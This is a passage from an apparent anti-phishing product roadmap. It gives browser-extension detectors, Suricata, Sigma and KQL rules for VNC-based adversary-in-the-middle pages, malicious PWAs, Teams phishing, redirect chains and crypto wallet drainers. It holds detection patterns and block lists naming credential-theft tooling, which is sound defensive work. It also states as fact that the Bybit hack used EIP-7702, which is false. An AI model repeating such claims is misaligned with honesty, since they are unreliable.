  //   - High-frequency binary WebSocket messages (VNC framebuffer updates)
  function checkCanvasWithoutInputs() {
    const canvases = document.querySelectorAll('canvas');
    const inputs   = document.querySelectorAll('input, textarea, select');
    const forms    = document.querySelectorAll('form');

    // heuristic: large canvas covering most of viewport = VNC display
    const largeCanvases = [...canvases].filter(c => {
      const rect = c.getBoundingClientRect();
      return rect.width > window.innerWidth  * 0.6 &&
             rect.height > window.innerHeight * 0.5;
    });

    return {
      hasLargeCanvas:  largeCanvases.length > 0,
      inputCount:      inputs.length,
      formCount:       forms.length,
      isVNCLikeLayout: largeCanvases.length > 0 && inputs.length === 0,
    };
  }

  // ── 3. WEBSOCKET MONITORING ───────────────────────────────────────────────
  // Intercept WebSocket constructor to monitor connections on suspicious domains.
  // VNC framebuffer messages are large (>1KB) binary blobs at high frequency.
  const wsActivity = {
    connections:    [],
    binaryMsgCount: 0,
    largeMsgCount:  0,
  };

  const OriginalWebSocket = window.WebSocket;

  class MonitoredWebSocket extends OriginalWebSocket {
    constructor(url, protocols) {
      super(url, protocols);
      wsActivity.connections.push(url);

      this.addEventListener('message', (event) => {
        if (event.data instanceof ArrayBuffer || event.data instanceof Blob) {
          wsActivity.binaryMsgCount++;
          const size = event.data instanceof ArrayBuffer
            ? event.data.byteLength
            : event.data.size;
          if (size > 1024) {  // >1KB binary = likely VNC framebuffer
            wsActivity.largeMsgCount++;
          }
          // If we're seeing a flood of large binary WS messages → VNC pattern
          if (wsActivity.largeMsgCount > 20) {
            VNCGuard.analyseAndAlert();
          }
        }
      });
    }
  }

  try {
    window.WebSocket = MonitoredWebSocket;
  } catch(e) {
    // CSP may block this; fall back to passive heuristics
  }

  // ── 4. WEBRTC DATA CHANNEL MONITORING (Cuddlephish) ──────────────────────
  // Cuddlephish uses WebRTC data channels instead of WebSocket.
  // Monitor RTCPeerConnection creation on suspicious-looking pages.
  const rtcActivity = { connections: 0, dataChannels: 0 };

  const OriginalRTCPeerConnection = window.RTCPeerConnection;
  if (OriginalRTCPeerConnection) {
    window.RTCPeerConnection = function(...args) {
      rtcActivity.connections++;
      const pc = new OriginalRTCPeerConnection(...args);
      const origCreateDC = pc.createDataChannel.bind(pc);
      pc.createDataChannel = function(...dcArgs) {
        rtcActivity.dataChannels++;
        return origCreateDC(...dcArgs);
      };
      return pc;
    };
  }

  // ── 5. TITLE / PAGE ROLE HEURISTIC ───────────────────────────────────────
  // EvilnoVNC pages often have titles like "noVNC", "KVM Console", "Remote Desktop"
  const VNC_TITLE_PATTERNS = [
    /novnc/i, /vnc viewer/i, /kvm console/i, /remote desktop/i,
    /remote access/i, /virtual desktop/i,
  ];

  function checkPageTitle() {
    return VNC_TITLE_PATTERNS.some(p => p.test(document.title));
  }

  // ── 6. MAIN ANALYSIS FUNCTION ─────────────────────────────────────────────
  function analyseAndAlert() {
    const noVNCLibs    = checkNoVNCLibraryImports();
    const canvasLayout = checkCanvasWithoutInputs();
    const vncTitle     = checkPageTitle();

    let score    = 0;
    const sigs   = [];

    if (noVNCLibs.length > 0) {
      score += 0.80;
      sigs.push(`novnc_library_import: ${noVNCLibs[0]}`);
    }
    if (canvasLayout.isVNCLikeLayout) {
      score += 0.55;
      sigs.push('canvas_without_inputs_credential_page_pattern');
    }
    if (wsActivity.largeMsgCount > 20) {
      score += 0.45;
      sigs.push(`high_frequency_binary_ws_messages: ${wsActivity.largeMsgCount}`);
    }
    if (rtcActivity.dataChannels > 0 && canvasLayout.hasLargeCanvas) {
      score += 0.60;
      sigs.push(`webrtc_data_channel_with_canvas: cuddlephish_pattern`);
    }
    if (vncTitle) {
      score += 0.25;
      sigs.push(`vnc_related_page_title: "${document.title}"`);
    }

    score = Math.min(score, 1.0);

    if (score >= 0.55) {
      chrome.runtime.sendMessage({
        type:      'PHISHING_ALERT',
        detector:  'VNCGuard',
        subtype:   rtcActivity.dataChannels > 0
                     ? 'WEBRTC_AITM_CUDDLEPHISH'
                     : 'WEBSOCKET_VNC_AITM_EVILNOVNC',
        severity:  score >= 0.80 ? 'Critical' : 'High',
        riskScore: score,
        url:       window.location.href,
        signals:   sigs,
        detail:    `VNC-over-WebSocket AiTM detected (EvilnoVNC/Cuddlephish class). ` +
                   `This attack streams the attacker's real browser as a VNC canvas — ` +
                   `all credentials entered are captured directly.`,
        mitre:     'T1557 — Adversary-in-the-Middle',
        remediation: 'Close this tab immediately. Do not enter any credentials.',
        wsConnections: wsActivity.connections.slice(0, 3),
      });
    }
  }

  // Run checks after DOM is ready + on mutation
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', analyseAndAlert);
  } else {
    analyseAndAlert();
  }

  // Re-check after dynamic content loads (SPA support)
  new MutationObserver(analyseAndAlert).observe(document.body, {
    childList: true, subtree: true
  });

  return { analyseAndAlert };
})();
```

**Add to `manifest.json`:**
```json
"content_scripts": [
  {
    "matches": ["<all_urls>"],
    "js": ["content/vncguard.js"],
    "run_at": "document_start"
  }
]
```

**Suricata rule for network layer:**
```suricata
# VNCGuard — Network-layer noVNC detection
# Detects WebSocket upgrade followed by high-rate binary VNC framebuffer traffic

alert http any any -> $HOME_NET any (
  msg:"VNCGUARD - noVNC WebSocket upgrade to suspicious domain";
  flow:established,to_server;
  http.header_names;  content:"Upgrade"; nocase;
  http.header;        content:"websocket"; nocase;
  http.uri;           content:"/websockify"; nocase;
  threshold:type limit, track by_src, count 1, seconds 300;
  classtype:trojan-activity; sid:9910001; rev:1;
)

alert http any any -> $HOME_NET any (
  msg:"VNCGUARD - noVNC auto-connect page served from non-enterprise domain";
  flow:established,to_client;
  http.response_body; content:"noVNC"; nocase;
  http.response_body; content:"rfb.js"; nocase;
  threshold:type limit, track by_src, count 1, seconds 300;
  classtype:trojan-activity; sid:9910002; rev:1;
)
```

---

### S2-B: ManifestAuditor / PWAGuard
**Effort:** 2–3 weeks | **New file:** `extension/content/pwa_guard.js`

```javascript
// extension/content/pwa_guard.js
// PWAGuard — Detects malicious Progressive Web App install attempts
// Sources: ESET Aug 2024, BleepingComputer Jun 2024, mrd0x blog Jun 2024

'use strict';

const PWAGuard = (() => {

  // Brand names that should NEVER appear as a PWA name on a third-party domain
  const HIGH_VALUE_BRANDS = new Set([
    'microsoft', 'office', 'outlook', 'teams', 'onedrive', 'sharepoint', 'azure',
    'google', 'gmail', 'workspace', 'drive',
    'apple', 'icloud',
    'paypal', 'stripe', 'square',
    'salesforce', 'okta', 'onelogin', 'ping',
    'amazon', 'aws',
    'facebook', 'meta', 'instagram',
    'bank', 'banking', 'chase', 'wells fargo', 'citibank', 'barclays',
    'coinbase', 'binance', 'metamask',
  ]);

  const LEGITIMATE_PWA_DOMAINS = new Set([
    // Domains allowed to install PWAs matching their brand
    'microsoft.com', 'office.com', 'outlook.com', 'live.com',
    'google.com', 'gmail.com',
    'apple.com', 'icloud.com',
  ]);

  function getDomainRoot(hostname) {
    return hostname.split('.').slice(-2).join('.').toLowerCase();
  }

  function containsBrandName(text) {
    if (!text) return null;
    const lower = text.toLowerCase();
    for (const brand of HIGH_VALUE_BRANDS) {
      if (lower.includes(brand)) return brand;
    }
    return null;
  }

  async function auditWebAppManifest(manifestUrl) {
    try {
      const resp = await fetch(manifestUrl);
      if (!resp.ok) return null;
      const manifest = await resp.json();

      const checks = {
        name:         manifest.name         || '',
        short_name:   manifest.short_name   || '',
        display:      manifest.display      || 'browser',
        start_url:    manifest.start_url    || '/',
        icons:        manifest.icons        || [],
        scope:        manifest.scope        || '/',
      };

      const findings = [];

      // Check 1: Brand name in PWA app name installed from third-party domain
      const domainRoot  = getDomainRoot(window.location.hostname);
      const brandInName = containsBrandName(checks.name) ||
                          containsBrandName(checks.short_name);

      if (brandInName && !LEGITIMATE_PWA_DOMAINS.has(domainRoot)) {
        findings.push({
          type:    'PWA_BRAND_IMPERSONATION_IN_MANIFEST_NAME',
          brand:   brandInName,
          appName: checks.name,
          domain:  window.location.hostname,
          risk:    0.85,
        });
      }

      // Check 2: standalone display = removes URL bar entirely
      if (checks.display === 'standalone' || checks.display === 'fullscreen') {
        findings.push({
          type:    'PWA_STANDALONE_DISPLAY_URL_BAR_REMOVAL',
          display: checks.display,
          risk:    0.40,   // Low alone; combined with brand name = high
        });
      }

      // Check 3: PWA icon visually similar to high-value brand
      // (heuristic — check icon URL for brand name)
      for (const icon of checks.icons) {
        const brandInIcon = containsBrandName(icon.src);
        if (brandInIcon && !LEGITIMATE_PWA_DOMAINS.has(domainRoot)) {
          findings.push({
            type:  'PWA_BRAND_ICON_FROM_THIRD_PARTY_DOMAIN',
            brand: brandInIcon,
            icon:  icon.src,
            risk:  0.60,
          });
        }
      }

      return findings;
    } catch(e) {
      return null;
    }
  }

  // Monitor beforeinstallprompt — fires when Chrome is about to offer PWA install
  window.addEventListener('beforeinstallprompt', async (event) => {
    const manifestLink = document.querySelector('link[rel="manifest"]');
    if (!manifestLink) return;

    const findings = await auditWebAppManifest(manifestLink.href);
    if (!findings || findings.length === 0) return;

    const maxRisk = Math.min(
      findings.reduce((acc, f) => acc + f.risk, 0),
      1.0
    );

    if (maxRisk >= 0.55) {
      // Prevent install dialog from appearing for suspicious PWAs
      event.preventDefault();

      chrome.runtime.sendMessage({
        type:     'PHISHING_ALERT',
        detector: 'PWAGuard',
        subtype:  'MALICIOUS_PWA_INSTALL_BLOCKED',
        severity: maxRisk >= 0.80 ? 'Critical' : 'High',
        riskScore: maxRisk,
        url:      window.location.href,
        signals:  findings.map(f => f.type),
        detail:   `Blocked malicious PWA install attempt. ` +
                  `Once installed, this app would display a fake URL bar ` +
                  `and remove all browser security indicators.`,
        mitre:    'T1566.002 — Phishing: Spearphishing Link',
        findings,
      });
    }
  });

  // Also check manifest proactively (don't wait for install prompt)
  async function proactiveManifestCheck() {
    const manifestLink = document.querySelector('link[rel="manifest"]');
    if (!manifestLink) return;

    const domainRoot = getDomainRoot(window.location.hostname);
    if (LEGITIMATE_PWA_DOMAINS.has(domainRoot)) return;  // Skip trusted domains

    const findings = await auditWebAppManifest(manifestLink.href);
    if (!findings || findings.length === 0) return;

    const hasBrandImpersonation = findings.some(f =>
      f.type === 'PWA_BRAND_IMPERSONATION_IN_MANIFEST_NAME'
    );

    if (hasBrandImpersonation) {
      chrome.runtime.sendMessage({
        type:     'PHISHING_ALERT',
        detector: 'PWAGuard',
        subtype:  'PWA_MANIFEST_BRAND_MISMATCH_DETECTED',
        severity: 'High',
        riskScore: 0.75,
        url:      window.location.href,
        signals:  findings.map(f => f.type),
        detail:   'PWA manifest contains brand name not matching hosting domain.',
        findings,
      });
    }
  }

  document.addEventListener('DOMContentLoaded', proactiveManifestCheck);

  return {};
})();
```

**Sigma rule for endpoint detection (PWA install via Sysmon):**
```yaml
title: PhishOps — Suspicious PWA Installation via Chrome/Edge
id: pwa-install-brand-mismatch
status: experimental
description: >
  Detects Chrome/Edge creating PWA shortcut files in user desktop/start menu
  using brand names associated with high-value targets.
  Source: ESET Aug 2024 — PWA/WebAPK banking phishing
references:
  - https://www.welivesecurity.com/en/eset-research/pwa-kit/
logsource:
  product: windows
  category: file_event
detection:
  selection:
    EventID: 11     # Sysmon FileCreate
    Image|endswith:
      - '\chrome.exe'
      - '\msedge.exe'
      - '\brave.exe'
    TargetFilename|contains:
      - '\Desktop\'
      - '\Start Menu\Programs\'
    TargetFilename|endswith: '.lnk'
  filter_legitimate:
    TargetFilename|contains:
      - 'Google Chrome'
      - 'Microsoft Edge'
      - 'Brave'
  condition: selection and not filter_legitimate
falsepositives:
  - Legitimate PWA installations (bookmark apps, etc.)
level: medium
tags:
  - attack.initial_access
  - attack.t1566.002
```

---

## SPRINT 3 — TeamsGuard + TPA Sentinel (Weeks 6–10)

---

### S3-A: TeamsGuard — Three-Layer Microsoft Teams Phishing Detection
**Effort:** 4–6 weeks | **New files:** `teamsguard/kql/`, `teamsguard/graph_monitor.py`,
`extension/content/teams_guard.js`

#### Layer 1: Sentinel KQL Library (deploy in days)

```kql
// ─────────────────────────────────────────────────────────────────────────────
// TeamsGuard KQL-01: External Sender Delivering Phishing Links via Teams
// Source: Microsoft Security Blog Oct 2025, Mar 16 2026
// Threat actors: Storm-1674, BlackBasta, Scattered Spider
// ─────────────────────────────────────────────────────────────────────────────
let KnownPhishingDomains = dynamic([
  "microsoftauth.zip", "office365-login.net", "teams-update.com"
  // append live TI feed here
]);
let PhishingURLPatterns = dynamic([
  "/kgwAVHGL", "/SThCPPlj",  // Evilginx 8-char token pattern
]);
CloudAppEvents
| where TimeGenerated > ago(1h)
| where ActionType in ("ChatCreated", "MessageSent", "MeetingChatCreated")
| extend SenderType    = tostring(RawEventData.SenderType)
| extend SenderDomain  = tostring(RawEventData.SenderDomain)
| extend MessageBody   = tostring(RawEventData.MessageText)
| extend Attachments   = RawEventData.Attachments
| where SenderType == "External"
| extend SuspiciousURL = extract(
    @"https?://([a-zA-Z0-9\-\.]+)/([A-Za-z0-9]{8})(\?|$)", 0, MessageBody
  )
| where isnotempty(SuspiciousURL)
      or SenderDomain in (KnownPhishingDomains)
| extend Alert = strcat(
    "TeamsGuard: External sender ",
    SenderDomain,
    " sent potential phishing link to ",
    tostring(RawEventData.RecipientEmail)
  )
| project TimeGenerated, SenderDomain, SuspiciousURL, Alert,
          RecipientEmail = RawEventData.RecipientEmail
| order by TimeGenerated desc

// ─────────────────────────────────────────────────────────────────────────────
// TeamsGuard KQL-02: Teams Message → Authentication Event Correlation
// Detects: victim receives Teams message → clicks link → authenticates from proxy IP
// ─────────────────────────────────────────────────────────────────────────────
let TeamsExternalMessages = CloudAppEvents
| where ActionType == "MessageSent"
| where tostring(RawEventData.SenderType) == "External"
| extend RecipientUPN = tostring(RawEventData.RecipientEmail)
| extend MsgTimestamp = TimeGenerated
| project RecipientUPN, MsgTimestamp;

TeamsExternalMessages
| join kind=inner (
    SigninLogs
    | where TimeGenerated > ago(2h)
    | where ResultType == "0"
    | extend SigninTimestamp = TimeGenerated
    | project UserPrincipalName, IPAddress, SigninTimestamp, Location
) on $left.RecipientUPN == $right.UserPrincipalName
| extend MinutesDelta = datetime_diff('minute', SigninTimestamp, MsgTimestamp)
| where MinutesDelta between (0 .. 30)
| extend IPCategory = case(
    IPAddress startswith "185.",  "Hosting/VPN",
    IPAddress startswith "45.14", "Hosting/VPN",
    "Unknown"
  )
| extend Alert = strcat(
    "TeamsGuard: Auth within 30min of external Teams message — possible AiTM delivery. ",
    "User: ", UserPrincipalName, " | IP: ", IPAddress
  )
| project MsgTimestamp, SigninTimestamp, UserPrincipalName, IPAddress, Location, Alert

// ─────────────────────────────────────────────────────────────────────────────
// TeamsGuard KQL-03: Quick Assist Abuse Post-Teams Vishing
// Source: Microsoft DART blog Mar 16 2026 — BlackBasta / Scattered Spider TTP
// ─────────────────────────────────────────────────────────────────────────────
DeviceProcessEvents
| where TimeGenerated > ago(1h)
| where FileName in ("quickassist.exe", "msra.exe", "msrdp.exe")
| where ProcessCommandLine contains "quickassist"
| join kind=inner (
    CloudAppEvents
    | where ActionType in ("CallStarted", "MeetingStarted")
    | where tostring(RawEventData.CallType) == "OneToOne"
    | extend CallerDomain = tostring(RawEventData.OrganizerDomain)
    | where CallerDomain !endswith ".yourcompany.com"  // adjust for your tenant
    | project DeviceName, ExternalCallerTime = TimeGenerated
) on DeviceName
| extend TimeDelta = datetime_diff('minute', TimeGenerated, ExternalCallerTime)
| where TimeDelta between (0 .. 20)
| extend Alert = strcat(
    "TeamsGuard CRITICAL: Quick Assist launched ",
    tostring(TimeDelta),
    " min after external Teams call — possible helpdesk vishing (BlackBasta TTP)"
  )
| project TimeGenerated, DeviceName, Alert, ProcessCommandLine
```

#### Layer 2: Browser Extension Content Script

```javascript
// extension/content/teams_guard.js
// TeamsGuard Layer 2 — Browser-side Teams phishing link analysis
// Runs on: teams.microsoft.com, teams.live.com

'use strict';

if (!location.hostname.includes('teams.microsoft.com') &&
    !location.hostname.includes('teams.live.com')) {
  // Only run on Teams web app
  throw new Error('teams_guard: not on Teams domain');
}

const TeamsGuard = (() => {

  // Evilginx 8-char lure URL pattern
  const EVILGINX_LURE = /https?:\/\/[^/]+\/[A-Za-z0-9]{8}(\?|$)/;

  // URL shorteners that mask phishing destinations
  const URL_SHORTENERS = new Set([
    'bit.ly','tinyurl.com','t.co','ow.ly','goo.gl',
    'short.io','rebrand.ly','cutt.ly','tiny.cc',
  ]);

  // Trusted internal domains (adjust for your tenant)
  const TRUSTED_DOMAINS = new Set([
    'microsoft.com','office.com','sharepoint.com','teams.microsoft.com',
    'outlook.com','live.com','azure.com',
  ]);

  function getDomainRoot(url) {
    try {
      return new URL(url).hostname.split('.').slice(-2).join('.').toLowerCase();
    } catch { return ''; }
  }

  function analyseTeamsLink(linkEl) {
    const href = linkEl.href || '';
    if (!href.startsWith('http')) return;

    const domain = getDomainRoot(href);
    const signals = [];

    if (EVILGINX_LURE.test(href))         signals.push('evilginx_8char_lure_url');
    if (URL_SHORTENERS.has(domain))       signals.push('url_shortener_masks_destination');
    if (!TRUSTED_DOMAINS.has(domain))     signals.push('external_domain_link');
    if (/@[^/]+@[^/]+/.test(href))        signals.push('url_userinfo_masking_starkiller');

    // Suspicious TLDs
    if (/\.(xyz|top|click|zip|vip|cam|gq|tk|ml|ga|cf)$/.test(domain)) {
      signals.push('suspicious_tld');
    }

    if (signals.length >= 2) {
      chrome.runtime.sendMessage({
        type:      'PHISHING_ALERT',
        detector:  'TeamsGuard',
        subtype:   'TEAMS_MESSAGE_PHISHING_LINK',
        severity:  signals.includes('evilginx_8char_lure_url') ? 'Critical' : 'High',
        riskScore: Math.min(signals.length * 0.25, 1.0),
        url:       href,
        signals,
        detail:    `Suspicious URL detected in Teams message. ` +
                   `External sender link matching phishing patterns.`,
        mitre:     'T1566.002',
      });

      // Visually warn user by wrapping link
      const warning = document.createElement('span');
      warning.textContent = '⚠️ PhishOps: Link flagged';
      warning.style.cssText = 'color:red;font-weight:bold;font-size:11px;margin-left:4px;';
      linkEl.parentNode.insertBefore(warning, linkEl.nextSibling);
    }
  }

  // Observe Teams message container for new messages
  function observeTeamsMessages() {
    const observer = new MutationObserver((mutations) => {
      for (const m of mutations) {
        for (const node of m.addedNodes) {
          if (!(node instanceof HTMLElement)) continue;
          node.querySelectorAll('a[href]').forEach(analyseTeamsLink);
        }
      }
    });

    // Teams uses a virtualised list — observe the root
    const root = document.getElementById('app-mount') ||
                 document.querySelector('[data-tid="chat-list"]') ||
                 document.body;

    observer.observe(root, { childList: true, subtree: true });
  }

  document.addEventListener('DOMContentLoaded', observeTeamsMessages);

  return {};
})();
```

#### Layer 3: Graph API Monitor Script

```python
# teamsguard/graph_monitor.py
# TeamsGuard Layer 3 — Microsoft Graph API external sender monitor
# Requires: app registration with TeamActivity.Read.All, AuditLog.Read.All
# Run as: scheduled task or Azure Function (every 15 minutes)

import os, requests, json
from datetime import datetime, timedelta, timezone

TENANT_ID     = os.environ['AZURE_TENANT_ID']
CLIENT_ID     = os.environ['TEAMSGUARD_APP_ID']
CLIENT_SECRET = os.environ['TEAMSGUARD_APP_SECRET']
WEBHOOK_URL   = os.environ.get('TEAMS_ALERT_WEBHOOK')  # Sentinel DCR endpoint


def get_graph_token() -> str:
    r = requests.post(
        f'https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token',
        data={
            'client_id':     CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'scope':         'https://graph.microsoft.com/.default',
            'grant_type':    'client_credentials',
        }
    )
    return r.json()['access_token']


def get_recent_external_teams_messages(token: str) -> list:
    """
    Query audit log for Teams messages from external senders in past 15 minutes.
    """
    since = (datetime.now(timezone.utc) - timedelta(minutes=15)).isoformat()
    headers = {'Authorization': f'Bearer {token}'}

    r = requests.get(
        'https://graph.microsoft.com/v1.0/auditLogs/directoryAudits',
        headers=headers,
        params={
            '$filter': f"loggedDateTime ge {since} and "
                       "activityDisplayName eq 'ChatMessageCreated'",
            '$top': 100,
        }
    )
    return r.json().get('value', [])


def analyse_message_for_phishing(msg: dict) -> dict | None:
    """Flag external messages containing Evilginx-pattern URLs."""
    import re
    body    = str(msg.get('additionalDetails', ''))
    sender  = msg.get('initiatedBy', {}).get('user', {}).get('userPrincipalName', '')

    # External sender heuristic: not in tenant domain
    is_external = '#EXT#' in sender or sender.endswith('.onmicrosoft.com') is False

    # Evilginx 8-char lure
    evilginx = re.search(r'https?://[^/]+/[A-Za-z0-9]{8}(\?|$)', body)

    if is_external and evilginx:
        return {
            'type':        'TEAMS_EXTERNAL_EVILGINX_LURE',
            'sender':      sender,
            'url_match':   evilginx.group(0),
            'timestamp':   msg.get('loggedDateTime'),
            'severity':    'Critical',
        }
    return None


def run():
    token    = get_graph_token()
    messages = get_recent_external_teams_messages(token)
    alerts   = [a for m in messages if (a := analyse_message_for_phishing(m))]

    for alert in alerts:
        print(f"[ALERT] {json.dumps(alert)}")
        if WEBHOOK_URL:
            requests.post(WEBHOOK_URL, json=alert)

    print(f"[TeamsGuard] Scanned {len(messages)} messages, {len(alerts)} alerts")


if __name__ == '__main__':
    run()
```

---

### S3-B: TPA Sentinel — Behavioral Redirect Chain Monitor
**Effort:** 4–6 weeks | **New file:** `extension/content/tpa_sentinel.js`

The core innovation is treating phishing delivery as a **graph problem**: map the entire
redirect chain, score each hop by trust level, and flag when the terminal node is a
credential-requiring page reached via a chain of trusted platforms.

```javascript
// extension/content/tpa_sentinel.js
// TPA Sentinel — Trusted Platform Abuse / Redirect Chain Monitor
// Source: PushSecurity "Death of Domain Reputation", Sekoia Jun 2025
// 77% of bypassed attacks use chained trusted platforms.

'use strict';

const TPASentinel = (() => {

  // Trust score: higher = more legitimate, less suspicious
  const PLATFORM_TRUST = {
    // High trust (widely abused as LOTL starting points)
    'calendly.com':       0.80,
    'docusign.com':       0.85,
    'docusign.net':       0.85,
    'typeform.com':       0.75,
    'jotform.com':        0.70,
    'hubspot.com':        0.80,
    'mailchimp.com':      0.75,
    'notion.site':        0.70,
    'canva.com':          0.75,
    'sites.google.com':   0.85,
    'sharepoint.com':     0.90,
    'onedrive.live.com':  0.90,
    'forms.office.com':   0.90,
    'sway.cloud.microsoft': 0.85,
    'wordpress.com':      0.70,
    'netlify.app':        0.60,
    'github.io':          0.65,
    'vercel.app':         0.60,
    'bit.ly':             0.30,  // URL shortener — low trust
    'tinyurl.com':        0.30,
  };

  function getDomain(url) {
    try {
      return new URL(url).hostname.split('.').slice(-2).join('.').toLowerCase();
    } catch { return ''; }
  }

  // Intercept fetch and XMLHttpRequest to track redirects
  const redirectChain = [window.location.href];

  const origFetch = window.fetch;
  window.fetch = async function(input, init) {
    const resp = await origFetch(input, init);
    if (resp.redirected) {
      redirectChain.push(resp.url);
    }
    return resp;
  };

  // Monitor navigation events
  window.addEventListener('beforeunload', () => {
    redirectChain.push(document.referrer || 'navigation');
  });

  function analyseRedirectChain() {
    if (redirectChain.length < 2) return;

    const chain          = redirectChain.map(url => ({
      url,
      domain:     getDomain(url),
      trustScore: PLATFORM_TRUST[getDomain(url)] ?? 0.0,
    }));

    const trustedHops    = chain.filter(h => h.trustScore >= 0.60);
    const terminalDomain = chain[chain.length - 1].domain;
    const terminalTrust  = PLATFORM_TRUST[terminalDomain] ?? 0.0;

    // Scoring: long chain through trusted platforms ending on unknown domain = phishing
    const chainDepth     = chain.length;
    const trustedHopCount= trustedHops.length;
    const terminalIsNew  = terminalTrust < 0.30;

    // TPA chaining signal: 2+ trusted platforms in chain, terminal is low-trust
    if (trustedHopCount >= 2 && terminalIsNew && chainDepth >= 3) {
      chrome.runtime.sendMessage({
        type:       'PHISHING_ALERT',
        detector:   'TPASentinel',
        subtype:    'TPA_CHAINED_REDIRECT_PHISHING',
        severity:   'High',
        riskScore:  Math.min(0.35 + (trustedHopCount * 0.15) + (chainDepth * 0.05), 1.0),
        url:        window.location.href,
        signals:    [`redirect_chain_depth_${chainDepth}`,
                     `${trustedHopCount}_trusted_platform_hops`,
                     `low_trust_terminal_domain_${terminalDomain}`],
        chain:      chain.slice(0, 8),   // cap payload size
        detail:     `Phishing via Trusted Platform Abuse (TPA chaining). ` +
                    `Redirect chain: ${chain.map(h => h.domain).join(' → ')}`,
        mitre:      'T1566.002 — Spearphishing Link via Trusted Platform',
        source:     'PushSecurity "Death of Domain Reputation" 2025',
      });
    }
  }

  document.addEventListener('DOMContentLoaded', analyseRedirectChain);
  setTimeout(analyseRedirectChain, 2000);   // Re-run after dynamic redirects

  return {};
})();
```

---

## SPRINT 4 — DrainerGuard + EtherHiding + StyleAuditor (Weeks 10–16)

---

### S4-A: DrainerGuard — EIP-7702 / Web3 Transaction Simulator
**Effort:** 4–6 weeks | **New file:** `extension/content/drainer_guard.js`

EIP-7702 (Ethereum Pectra upgrade, May 2025): victims sign "authorization tuples" that
temporarily convert their EOA wallet into a malicious smart contract, draining all assets.
97% of wild delegations are malicious. Bybit's $1.5B hack used this vector.

```javascript
// extension/content/drainer_guard.js
// DrainerGuard — EIP-7702 Delegation + Web3 Approval Phishing Detection
// Sources: DEF CON 33, SlowMist Research (97% malicious), Scam Sniffer

'use strict';

const DrainerGuard = (() => {

  // ── EIP-7702 TRANSACTION DETECTION ───────────────────────────────────────
  // EIP-7702 transactions have type 0x04 (new in Pectra upgrade)
  // Authorization tuple: [chain_id, address, nonce, y_parity, r, s]

  const EIP7702_TX_TYPE = '0x04';

  function interceptEthSendTransaction() {
    if (!window.ethereum) return;

    const origRequest = window.ethereum.request.bind(window.ethereum);

    window.ethereum.request = async function(args) {
      if (args.method === 'eth_sendTransaction' && args.params?.[0]) {
        const tx = args.params[0];

        // Detect EIP-7702 delegation (type 0x04)
        if (tx.type === EIP7702_TX_TYPE || tx.authorizationList?.length > 0) {
          const delegateTarget = tx.authorizationList?.[0]?.address || 'unknown';

          const simulation = await simulateDelegation(delegateTarget);

          chrome.runtime.sendMessage({
            type:      'PHISHING_ALERT',
            detector:  'DrainerGuard',
            subtype:   'EIP7702_DELEGATION_SIGNING',
            severity:  simulation.isDrainer ? 'Critical' : 'High',
            riskScore: simulation.isDrainer ? 0.97 : 0.70,
            url:       window.location.href,
            signals:   [
              'eip7702_type_04_transaction',
              simulation.isDrainer ? 'known_drainer_contract' : 'unverified_delegate',
            ],
            detail:    `EIP-7702 delegation detected. Target: ${delegateTarget}. ` +
                       `${simulation.isDrainer ? 'KNOWN DRAINER — DO NOT SIGN.' : 
                          'Unverified delegate. Simulation: ' + simulation.summary}`,
            txData:    {
              type:             tx.type,
              delegateTarget,
              simulationResult: simulation,
            },
          });

          if (simulation.isDrainer) {
            // Block the transaction (return rejected promise)
            throw new Error('DrainerGuard: Transaction blocked — known drainer contract');
          }
        }

        // Detect batch token approvals (common wallet drainer pattern)
        if (tx.data && tx.data.startsWith('0x095ea7b3')) {  // approve() selector
          const approvalAnalysis = analyseTokenApproval(tx);
          if (approvalAnalysis.isUnlimitedApproval && approvalAnalysis.isNewContract) {
            chrome.runtime.sendMessage({
              type:      'PHISHING_ALERT',
              detector:  'DrainerGuard',
              subtype:   'UNLIMITED_TOKEN_APPROVAL_NEW_CONTRACT',
              severity:  'High',
              riskScore: 0.80,
              url:       window.location.href,
              signals:   ['unlimited_erc20_approval', 'new_unverified_spender_contract'],
              detail:    `Unlimited token approval to unverified contract ${approvalAnalysis.spender}`,
            });
          }
        }
      }

      return origRequest(args);
    };
  }

  async function simulateDelegation(contractAddress) {
    // Query Alchemy Simulation API (Tenderly also works)
    // In production: use Alchemy's `alchemy_simulateExecution` or Tenderly fork API
    try {
      const DRAINER_DB_URL =
        'https://raw.githubusercontent.com/scamsniffer/scam-database/main/blacklist/address.json';
      const resp = await fetch(DRAINER_DB_URL);
      const knownDrainers = await resp.json();
      const isDrainer = knownDrainers.includes(contractAddress.toLowerCase());

      return {
        isDrainer,
        summary: isDrainer
          ? 'Contract is in Scam Sniffer drainer database'
          : 'Contract not in known drainer lists — manual review advised',
        contractAddress,
      };
    } catch {
      return { isDrainer: false, summary: 'Simulation unavailable', contractAddress };
    }
  }

  function analyseTokenApproval(tx) {
    // approve(address spender, uint256 amount)
    // Check if amount == MaxUint256 (unlimited approval)
    const MAX_UINT256 = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    const isUnlimited = tx.data.slice(-64) === MAX_UINT256;
    const spender     = '0x' + tx.data.slice(34, 74);  // extract spender from calldata

    return { isUnlimitedApproval: isUnlimited, spender, isNewContract: true };
  }

  // ── PERMIT / PERMIT2 SIGNATURE DETECTION ─────────────────────────────────
  // Permit2 allows signing an off-chain message to approve token spending
  // without a transaction — common in gasless drainer attacks

  function interceptSignTypedData() {
    if (!window.ethereum) return;

    const origRequest = window.ethereum.request.bind(window.ethereum);
    window.ethereum.request = async function(args) {
      if (args.method === 'eth_signTypedData_v4') {
        try {
          const data = JSON.parse(args.params[1]);
          if (data.primaryType === 'PermitBatch' ||
              data.primaryType === 'Permit' ||
              data.primaryType === 'PermitTransferFrom') {
            chrome.runtime.sendMessage({
              type:      'PHISHING_ALERT',
              detector:  'DrainerGuard',
              subtype:   'PERMIT2_SIGNATURE_REQUEST',
              severity:  'High',
              riskScore: 0.75,
              url:       window.location.href,
              signals:   ['permit2_signature_off_chain_approval'],
              detail:    `Permit2 signature request — could approve spending without gas. ` +
                         `Primary type: ${data.primaryType}`,
            });
          }
        } catch {}
      }
      return origRequest(args);
    };
  }

  // Initialise all interceptors
  interceptEthSendTransaction();
  interceptSignTypedData();

  return {};
})();
```

---

### S4-B: EtherHiding / Blockchain-Hosted ClickFix Enhancement
**Effort:** 2 weeks | **File:** `extension/background/service_worker.js` (ClipboardDefender section)

**Current gap:** ClipboardDefender detects ClickFix clipboard writes but doesn't catch
